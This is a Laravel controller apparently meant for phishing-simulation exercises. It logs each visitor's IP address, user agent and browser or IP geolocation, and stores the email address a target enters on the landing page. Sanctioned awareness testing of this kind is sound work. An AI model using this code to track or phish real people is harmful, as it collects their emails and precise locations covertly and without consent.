<?php

namespace App\Http\Controllers;

use App\Models\PhishingLog;
use Illuminate\Http\Request;
use Illuminate\Http\JsonResponse;
use Illuminate\Support\Facades\Http;

class PhishingSimulationController extends Controller
{
    /**
     * Show the phishing simulation landing page.
     * Called when the target clicks the link in their email.
     */
    public function show(Request $request): \Illuminate\View\View
    {
        $sessionId = $this->getSessionId($request);
        $ip = $this->resolvePublicIp($request);
        $geo = $this->getLatitudeLongitude($ip);

        PhishingLog::updateOrCreate([
            'session_id' => $sessionId,
        ], [
            'ip_address' => $ip,
            'latitude' => $geo['latitude'],
            'longitude' => $geo['longitude'],
            'location_label' => $geo['location_label'],
            'user_agent' => $request->userAgent(),
            'captured_at' => now(),
        ]);

        return view('phishing-simulation');
    }

    /**
     * Track client info immediately when the page is opened.
     */
    public function track(Request $request): JsonResponse
    {
        $validated = $request->validate([
            'public_ip'      => ['nullable', 'ip'],
            'latitude'       => ['required', 'numeric', 'between:-90,90'],
            'longitude'      => ['required', 'numeric', 'between:-180,180'],
            'location_label' => ['nullable', 'string', 'max:255'],
        ]);

        $sessionId = $this->getSessionId($request);
        $ip = $this->resolveClientIp($request, $validated['public_ip'] ?? null);
        $geo = $this->getLatitudeLongitude($ip);

        PhishingLog::updateOrCreate([
            'session_id' => $sessionId,
        ], [
            'ip_address' => $ip,
            'latitude' => $validated['latitude'] ?? $geo['latitude'],
            'longitude' => $validated['longitude'] ?? $geo['longitude'],
            'location_label' => $validated['location_label'] ?? $geo['location_label'],
            'user_agent' => $request->userAgent(),
            'captured_at' => now(),
        ]);

        return response()->json(['success' => true]);
    }

    /**
     * Store the captured data submitted from the form.
     * Records: email, IP address, timestamp, and geolocation.
     */
    public function capture(Request $request): JsonResponse
    {
        $validated = $request->validate([
            'email'          => ['required', 'email', 'max:255'],
            'public_ip'      => ['nullable', 'ip'],
            'latitude'       => ['required', 'numeric', 'between:-90,90'],
            'longitude'      => ['required', 'numeric', 'between:-180,180'],
            'location_label' => ['nullable', 'string', 'max:255'],
        ]);

        $sessionId = $this->getSessionId($request);
        $ip = $this->resolveClientIp($request, $validated['public_ip'] ?? null);
        $geo = $this->getLatitudeLongitude($ip);

        $latitude = $validated['latitude'] ?? $geo['latitude'];
        $longitude = $validated['longitude'] ?? $geo['longitude'];
        $locationLabel = $validated['location_label'] ?? $geo['location_label'];

        PhishingLog::updateOrCreate([
            'session_id' => $sessionId,
        ], [
            'email'          => $validated['email'],
            'ip_address'     => $ip,
            'latitude'       => $latitude,
            'longitude'      => $longitude,
            'location_label' => $locationLabel,
            'user_agent'     => $request->userAgent(),
            'captured_at'    => now(),
        ]);

        return response()->json(['success' => true]);
    }

    private function getSessionId(Request $request): string
    {
        if (! $request->hasSession() || ! $request->session()->isStarted()) {
            $request->session()->start();
        }

        return $request->session()->getId();
    }

    /**
     * Prefer browser-resolved public IP when present, then fallback to headers.
     */
    private function resolveClientIp(Request $request, ?string $clientReportedIp): ?string
    {
        if ($this->isPublicIp($clientReportedIp)) {
            return $clientReportedIp;
        }

        return $this->resolvePublicIp($request);
    }

    /**
     * Resolve public client IP from trusted and common proxy headers.
     */
    private function resolvePublicIp(Request $request): ?string
    {
        $candidates = [];

        $headers = [
            'CF-Connecting-IP',
            'X-Forwarded-For',
            'X-Real-IP',
            'True-Client-IP',
            'X-Client-IP',
            'X-Cluster-Client-IP',
            'Forwarded',
        ];

        foreach ($headers as $header) {
            $value = (string) $request->header($header, '');
            if ($value === '') {
                continue;
            }

            if ($header === 'Forwarded' && preg_match('/for="?\\[?([^\\];",]+)\\]?/i', $value, $matches)) {
                $candidates[] = trim($matches[1]);
                continue;
            }

            foreach (explode(',', $value) as $ip) {
                $candidates[] = trim($ip);
            }
        }

        $candidates[] = (string) $request->ip();

        foreach ($candidates as $candidate) {
            if ($this->isPublicIp($candidate)) {
                return $candidate;
            }
        }

        foreach ($candidates as $candidate) {
            if (filter_var($candidate, FILTER_VALIDATE_IP)) {
                return $candidate;
            }
        }

        return null;
    }

    /**
     * Return latitude/longitude using IP geolocation as fallback.
     *
     * @return array{latitude: float|null, longitude: float|null, location_label: string}
     */
    private function getLatitudeLongitude(?string $ip): array
    {
        if (! $ip || ! $this->isPublicIp($ip)) {
            return [
                'latitude' => null,
                'longitude' => null,
                'location_label' => 'Not available',
            ];
        }

        try {
            $endpoint = str_replace('{ip}', $ip, (string) env(
                'GEOIP_LOOKUP_URL',
                'https://ipapi.co/{ip}/json/'
            ));

            $response = Http::timeout(3)->acceptJson()->get($endpoint);

            if (! $response->ok()) {
                return [
                    'latitude' => null,
                    'longitude' => null,
                    'location_label' => 'Not available',
                ];
            }

            $data = $response->json();

            $lat = $data['latitude'] ?? $data['lat'] ?? null;
            $lng = $data['longitude'] ?? $data['lon'] ?? null;

            $latitude = is_numeric($lat) ? (float) $lat : null;
            $longitude = is_numeric($lng) ? (float) $lng : null;

            $parts = array_filter([
                $data['city'] ?? null,
                $data['region'] ?? $data['regionName'] ?? null,
                $data['country_name'] ?? $data['country'] ?? null,
            ]);

            return [
                'latitude' => $latitude,
                'longitude' => $longitude,
                'location_label' => $parts ? implode(', ', $parts) : 'Not available',
            ];
        } catch (\Throwable) {
            return [
                'latitude' => null,
                'longitude' => null,
                'location_label' => 'Not available',
            ];
        }
    }

    private function isPublicIp(?string $ip): bool
    {
        if (! $ip) {
            return false;
        }

        return filter_var(
            $ip,
            FILTER_VALIDATE_IP,
            FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE
        ) !== false;
    }
}
